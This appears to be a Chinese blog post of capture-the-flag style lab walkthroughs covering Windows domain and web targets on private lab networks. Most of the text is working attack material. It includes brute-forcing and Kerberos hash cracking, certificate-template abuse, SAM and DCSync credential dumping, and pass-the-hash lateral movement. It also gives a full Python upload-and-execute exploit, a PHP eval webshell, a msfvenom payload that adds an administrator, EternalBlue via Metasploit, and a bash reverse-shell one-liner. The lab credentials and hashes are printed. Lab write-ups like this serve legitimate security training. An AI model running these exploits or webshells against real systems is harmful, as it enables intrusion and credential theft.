<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">└─<span class="hljs-meta"># proxychains4 -q hydra -L <span class="hljs-string">&quot;/home/kali/1.txt&quot;</span> -P <span class="hljs-string">&quot;/home/kali/2.txt&quot;</span> 172.22.9.26 rdp -vV </span><br></code></pre></td></tr></table></figure>

<p>得到账号密码 但是没有权限登录rdp</p>
<p>zhangjian–i9XDE02pLVf<br>liupeng–fiAzGwEMgTY</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> python3 GetUserSPNs.py -request -dc-ip <span class="hljs-number">172.22.9.7</span> xiaorang.lab/zhangjian<br></code></pre></td></tr></table></figure>

<p>得到TGS-REP hash</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">└─# hashcat -m <span class="hljs-number">13100</span> -a <span class="hljs-number">0</span> --force hash.txt <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure>

<p>得到zhangjian&#x2F;MyPass2@@6</p>
<p>chenchen&#x2F;@Passw0rd@</p>
<p>！注意 登录名称加上@域名</p>
<p>登录后用户权限不足访问文件夹，根据靶场名称使用certipy</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> certipy find -u <span class="hljs-string">&#x27;zhangxia<span class="hljs-variable">@xiaorang</span>.lab&#x27;</span>  -password <span class="hljs-string">&#x27;MyPass2@@6&#x27;</span> -dc-ip <span class="hljs-number">172.22.9.7</span> -vulnerable -stdout<br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108113617951.png" srcset="/img/loading.gif" lazyload alt="image-20241108113617951"></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> certipy req -u <span class="hljs-string">&#x27;zhangjian<span class="hljs-variable">@xiaorang</span>.lab&#x27;</span> -p <span class="hljs-string">&#x27;i9XDE02pLVf&#x27;</span> -target <span class="hljs-number">172.22.9.7</span> -dc-ip <span class="hljs-number">172.22.9.7</span> -ca <span class="hljs-string">&quot;xiaorang-XIAORANG-DC-CA&quot;</span> -template <span class="hljs-string">&#x27;XR Manager&#x27;</span>  -upn administrator<span class="hljs-variable">@xiaorang</span>.lab<br><br>proxychains4 certipy auth -pfx administrator.pfx -dc-ip <span class="hljs-number">172.22.9.7</span><br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108113550386.png" srcset="/img/loading.gif" lazyload alt="image-20241108113550386"></p>
<p>剩下两台主机横向即可，推荐psexec等可以交互的 SMB不太好</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> crackmapexec smb <span class="hljs-number">172.22.9.7</span> -u administrator -H aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">2</span>f1b57eefb2d152196836b0516abea80 -d xiaorang.lab<br></code></pre></td></tr></table></figure>



<h2 id="ThermalPower-（ok）"><a href="#ThermalPower-（ok）" class="headerlink" title="ThermalPower （ok）"></a>ThermalPower （ok）</h2><p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112151857463.png" srcset="/img/loading.gif" lazyload alt="image-20241112151857463"></p>
<p>扫出来heapdump泄露 访问&#x2F;actuator&#x2F;heapdump直接下载下</p>
<p>解密出来shirokey</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112152027355.png" srcset="/img/loading.gif" lazyload alt="image-20241112152027355"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112152527136.png" srcset="/img/loading.gif" lazyload alt="image-20241112152527136"></p>
<p>172.22.17段  发现另一台.6的机子，存在ftp匿名访问</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112152930939.png" srcset="/img/loading.gif" lazyload alt="image-20241112152930939"></p>
<p>把文件都拉下来</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112153224439.png" srcset="/img/loading.gif" lazyload alt="image-20241112153224439"></p>
<p>同时有大量账号 做一下拼接</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112153255276.png" srcset="/img/loading.gif" lazyload alt="image-20241112153255276"></p>
<p>给出的管理员是22段的，后面再用，先进行smb爆破</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nxc<span class="hljs-selector-class">.exe</span> smb <span class="hljs-number">172.22</span>.<span class="hljs-number">17.6</span> -u E:\Destop\name<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> E:\Destop\pass<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--no-bruteforce</span><br></code></pre></td></tr></table></figure>

<p>（其实这里应该直接使用SCADA工程师用户登录smb的）</p>
<p>登上rdp之后 根据提示 检查特权</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112160151386.png" srcset="/img/loading.gif" lazyload alt="image-20241112160151386"></p>
<p>但是这里可以直接转存sam表和system</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> hklm\sam sam.hive<br>reg <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive<br></code></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> secretsdump.<span class="hljs-keyword">py</span> -sam E:\Destop\sam.hive -<span class="hljs-built_in">system</span> <br><br>nxc.<span class="hljs-keyword">exe</span> smb <span class="hljs-number">172.22</span>.<span class="hljs-number">17.6</span> -<span class="hljs-keyword">u</span> Administrator -H f82292b7ac79b05d5b0e3d<br><span class="hljs-number">302</span>bd0d279 -<span class="hljs-keyword">X</span> <span class="hljs-string">&quot;type ~/flag/f*&quot;</span><br></code></pre></td></tr></table></figure>

<p>接下来 用刚刚ftp获得的一个管理员凭据爆破</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WIN</span>-SCADA: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">26</span>.xx<br><span class="hljs-attribute">Username</span>: Administrator<br><span class="hljs-attribute">Password</span>: IYnT3GyCiy3<br><br><span class="hljs-attribute">nxc</span>.exe smb <span class="hljs-number">172.22.26.1</span>/<span class="hljs-number">24</span> -u Administrator -p IYnT3GyCiy3<br></code></pre></td></tr></table></figure>

<p>flag3登录上去点击就送</p>
<h2 id="Initial（ok）"><a href="#Initial（ok）" class="headerlink" title="Initial（ok）"></a>Initial（ok）</h2><p>外网没什么好说的 tp框架 工具梭</p>
<p>sudo -l 发现mysql特权</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114152154847.png" srcset="/img/loading.gif" lazyload alt="image-20241114152154847"></p>
<p>提不了权 直接读一个flag</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114152343340.png" srcset="/img/loading.gif" lazyload alt="image-20241114152343340"></p>
<p>fscan -h xxxx&#x2F;24 -hn 跳过本机ip</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114152718660.png" srcset="/img/loading.gif" lazyload alt="image-20241114152718660"></p>
<p>发现还有三台主机</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.18</span> 开了<span class="hljs-number">3389</span>的信呼OA<br><span class="hljs-number">172.22.1.21</span> win7<br><span class="hljs-number">172.22.1.2</span>  域控<br></code></pre></td></tr></table></figure>

<p>exp直接打oa</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import requests<br>session = requests<span class="hljs-selector-class">.session</span>()<br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br>url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=::&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br>r = session<span class="hljs-selector-class">.post</span>(url1, data=data1)<br>r = session<span class="hljs-selector-class">.post</span>(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br>filepath = <span class="hljs-built_in">str</span>(r<span class="hljs-selector-class">.json</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;filepath&#x27;</span>]</span>)<br>filepath = <span class="hljs-string">&quot;/&quot;</span> + filepath<span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)<span class="hljs-selector-attr">[0]</span> + <span class="hljs-string">&#x27;.php&#x27;</span><br>id = r<span class="hljs-selector-class">.json</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;id&#x27;</span>]</span><br>url3 = url_pre + f<span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br>r = session<span class="hljs-selector-class">.get</span>(url3)<br>r = session<span class="hljs-selector-class">.get</span>(url_pre + filepath)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(r.text)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(url_pre + filepath)</span></span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://172.22.1.18//upload/2024-11/14_15460476.php">http://172.22.1.18//upload/2024-11/14_15460476.php</a></p>
<p>尝试对win2008 使用永恒之蓝 这里用方程式</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">msfvenom -p windows/exec CMD=<span class="hljs-string">&#x27;cmd.exe /k &quot;net user test test@123 /add &amp;&amp; net localgroup administrators test /add&quot;&#x27;</span> EXITFUNC=<span class="hljs-built_in">none</span> -f dll &gt; <span class="hljs-regexp">/tmp/</span>x64.dll<br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114160018542.png" srcset="/img/loading.gif" lazyload alt="image-20241114160018542"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114160724717.png" srcset="/img/loading.gif" lazyload alt="image-20241114160724717"></p>
<p>一直没打通 换msf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 -q msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21<br>exploit<br></code></pre></td></tr></table></figure>

<p>尝试psexec失败 可能没开admin$</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> psexec.py xiaorang.lab/administrator@<span class="hljs-number">172.22.1.2</span> -hashes AADA8EDA23213C025AE50F5CD5697D9F:<span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cmb</span>拿下flag<br><span class="hljs-attribute">proxychains4</span> -q crackmapexec smb <span class="hljs-number">172.22.1.2</span> -u Administrator -H <span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8 -x <span class="hljs-string">&quot;type users/administrator/f*&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114162501036.png" srcset="/img/loading.gif" lazyload alt="image-20241114162501036"></p>
<h2 id="Flarum（ok）"><a href="#Flarum（ok）" class="headerlink" title="Flarum（ok）"></a>Flarum（ok）</h2><p>提示弱口令 爆破得到administrator&#x2F;1chris</p>
<p>根据<a target="_blank" rel="noopener" href="https://tttang.com/archive/1714/">从偶遇Flarum开始的RCE之旅 - 跳跳糖</a></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115154943338.png" srcset="/img/loading.gif" lazyload alt="image-20241115154943338"></p>
<p>插入css后再将css修改为</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.test</span> &#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-built_in">data-uri</span>(<span class="hljs-string">&#x27;phar://./assets/forum.css&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>查suid</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115155101882.png" srcset="/img/loading.gif" lazyload></p>
<p>利用capabilities提权</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115155555520.png" srcset="/img/loading.gif" lazyload alt="image-20241115155555520"></p>
<p>openssl利用</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">openssl</span> enc -in <span class="hljs-string">&quot;/root/flag/flag01.txt&quot;</span><br></code></pre></td></tr></table></figure>

<p>在访问web的时候可以发现assets目录，在shell中找到&#x2F;public&#x2F;assets写马（注意转义$）</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt; 1.php</span><br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/fscan -h 172.22.60.52/</span><span class="hljs-number">24</span> -hn <span class="hljs-number">172.22</span>.<span class="hljs-number">60.52</span> &gt;<span class="hljs-number">1</span>.txt <br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115160055948.png" srcset="/img/loading.gif" lazyload alt="image-20241115160055948"></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.60.8</span> DC<br><br><span class="hljs-number">172.22.60.15</span> 个人主机 <br><br><span class="hljs-number">172.22.60.42</span> 文件服务器<br></code></pre></td></tr></table></figure>

<p>这里由于没明显的横向手段，再第一台机子上再做信息收集</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115160523067.png" srcset="/img/loading.gif" lazyload alt="image-20241115160523067"></p>
<p>navicat socks有点麻烦 走蚁剑</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115161558953.png" srcset="/img/loading.gif" lazyload alt="image-20241115161558953"></p>
<p>拿到一个name表</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115161654237.png" srcset="/img/loading.gif" lazyload alt="image-20241115161654237"></p>
<p>尝试AS-REP ROASTING 找没开启预认证的用户（GetnpUser 指定dcip 用户字典 域名称+&#x2F;）</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> GetNPUsers.py -dc-ip <span class="hljs-number">172.22.60.8</span> -usersfile E:\Destop\name.txt xiaorang.lab/<br>！记得加/<br></code></pre></td></tr></table></figure>

<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo hashcat -m <span class="hljs-number">18200</span> <span class="hljs-symbol">&#x27;hash</span>&#x27; 字典 <span class="hljs-comment">--force</span><br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115163140719.png" srcset="/img/loading.gif" lazyload alt="image-20241115163140719"></p>
<p>得到一个wangyun&#x2F;Adm12geC</p>
<p>rdp登个人pc 发现xshell SharpXDecrypt提取密码</p>
<p>zhangxin&#x2F;admin4qwY38cc</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115163354768.png" srcset="/img/loading.gif" lazyload alt="image-20241115163354768"></p>
<p>再收集一下域内信息</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11555?time__1311=mqmx0DBD2Gqiw40vofDy7D9m6GOCDcGiG7oD&alichlgref=https://xz.aliyun.com/u/50470#toc-18">域渗透之委派攻击全集 - 先知社区</a></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">指定用户密码，域名和域ip<br>proxychains -<span class="hljs-selector-tag">q</span> bloodhound-python -u wangyun -<span class="hljs-selector-tag">p</span> Adm12geC -d xiaorang<span class="hljs-selector-class">.lab</span> -c <span class="hljs-attribute">all</span> -ns <span class="hljs-number">172.22</span>.<span class="hljs-number">60.8</span> <span class="hljs-attr">--zip</span> <span class="hljs-attr">--dns-tcp</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">添加机器用户<br>proxychains4 impacket-addcomputer xiaorang.lab/zhangxin:<span class="hljs-string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">60.8</span> -dc-host xiaorang<span class="hljs-selector-class">.lab</span> -computer-name <span class="hljs-string">&#x27;hacker$&#x27;</span> -computer-pass <span class="hljs-string">&#x27;0x401@admin&#x27;</span><br>配置rbcd<br>proxychains4 impacket-rbcd xiaorang.lab/zhangxin:<span class="hljs-string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">60.8</span> -action write -delegate-to <span class="hljs-string">&#x27;Fileserver$&#x27;</span> -delegate-from <span class="hljs-string">&#x27;hacker$&#x27;</span><br>伪造票据<br>proxychains4 impacket-getST xiaorang.lab/<span class="hljs-string">&#x27;hacker$&#x27;</span>:<span class="hljs-string">&#x27;0x401@admin&#x27;</span> -spn cifs/Fileserver<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -impersonate Administrator -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">60.8</span><br>制定票据<br>export KRB5CCNAME=Administrator<span class="hljs-selector-class">.ccache</span><br>ccache改名 修改hosts文件<br>横向移动<br>proxychains4 impacket-psexec Administrator@FILESERVER<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -k -no-pass -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">60.8</span> -codec gbk<br></code></pre></td></tr></table></figure>

<p>fileserver开了DCSync</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cobol">proxychains4 impacket-secretsdump -k -no-pass FILESERVER.xiaorang.lab -dc-ip 172.22.60.8<br>获取system hash值<br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115170109853.png" srcset="/img/loading.gif" lazyload alt="image-20241115170109853"></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> impacket-secretsdump xiaorang.lab/<span class="hljs-string">&#x27;Fileserver$&#x27;</span>:@<span class="hljs-number">172.22.60.8</span> -hashes <span class="hljs-string">&#x27;:951d8a9265dfb652f42e5c8c497d70dc&#x27;</span> -just-dc-user Administrator<br></code></pre></td></tr></table></figure>

<p>再去打dscync</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115170215843.png" srcset="/img/loading.gif" lazyload alt="image-20241115170215843"></p>
<p>拿到hash横向就可以了</p>
<h2 id="TIME（ok）"><a href="#TIME（ok）" class="headerlink" title="TIME（ok）"></a>TIME（ok）</h2><p>默认fscan没扫到东西</p>
<p>fscan -h 39.99.130.250 -p 0-65535 扫全端口</p>
<p>（这里其实在扫全端口过程中发现开了neo4j 直接搜到文章）</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Kawakaze777/p/18153842">CVE-2021-34371 Neo4j-Shell 漏洞复现 - 凪白Kw - 博客园</a></p>
<p>出于编码问题 本来需要base编码反弹shell语句</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">&quot;bash -c </span><span class="hljs-template-variable">&#123;echo,base编码的bash -i &gt;&amp; /dev/tcp/ip/4444&gt;&amp;1&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="language-xml">&quot; </span><br></code></pre></td></tr></table></figure>

<p> 但这里貌似环境冲突，让朋友直接给我弹了一个msf shell</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118151916370.png" srcset="/img/loading.gif" lazyload alt="image-20241118151916370"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118152046360.png" srcset="/img/loading.gif" lazyload alt="image-20241118152046360"></p>
<p>-hn跳过本机</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.6.12</span> DC<br><span class="hljs-number">172.22.6.25</span> WIN2019<br><span class="hljs-number">172.22.6.38</span> 后台登陆web<br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118152239390.png" srcset="/img/loading.gif" lazyload alt="image-20241118152239390"></p>
<p>搭好隧道。提示kerberos协议</p>
<p>猜到可能又是GetNPusers </p>
<p>很无奈这里是一个前台登录sql注入 sqlmap –dump脱库</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118152850681.png" srcset="/img/loading.gif" lazyload alt="image-20241118152850681"></p>
<p>处理文件格式</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">awk</span> -F@ <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> ./name.txt&gt;<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo hashcat -m <span class="hljs-number">18200</span> hash.txt <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt --force<br></code></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wenshao/hellokitty<br>zhangxin/strawberry<br></code></pre></td></tr></table></figure>

<p>RDP登录 bloodhound找攻击路径</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118160210757.png" srcset="/img/loading.gif" lazyload alt="image-20241118160210757"></p>
<p>这里发现需要也得到yuxuan用户权限，抓内存凭据失败，看文章找到抓自动登录密码</p>
<p>可以用msf autologin 或者 winpeas 也可以</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118173604270.png" srcset="/img/loading.gif" lazyload alt="image-20241118173604270"></p>
<p>yuxuan&#x2F;Yuxuan7QbrgZ3L</p>
<p>使用该用户登录后 利用sid权限滥用直接dump哈希</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lsadump::dcsync <span class="hljs-regexp">/domain:xiaorang.lab /</span>all /csv<span class="hljs-string">&quot; &quot;</span><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>

<p>后面psexec横向</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118174216674.png" srcset="/img/loading.gif" lazyload alt="image-20241118174216674"></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">python3 psexec<span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">a</span><br>dministrator<span class="hljs-keyword">@172</span>.22.6.12 -hashes <span class="hljs-string">&quot;:04d93ffd6f5f6e4490e0de23f240a5e9&quot;</span> -codec gbk<br></code></pre></td></tr></table></figure>



<h2 id="Delivery"><a href="#Delivery" class="headerlink" title="Delivery"></a>Delivery</h2><p>fscan发现ftp匿名登录和一个web界面</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120095826399.png" srcset="/img/loading.gif" lazyload alt="image-20241120095826399"></p>
<p>下载发现XStream和cc依赖</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/thelostworld/p/14810682.html">XStream远程代码执行（CVE-2021-29505 ） - thelostworld - 博客园</a></p>
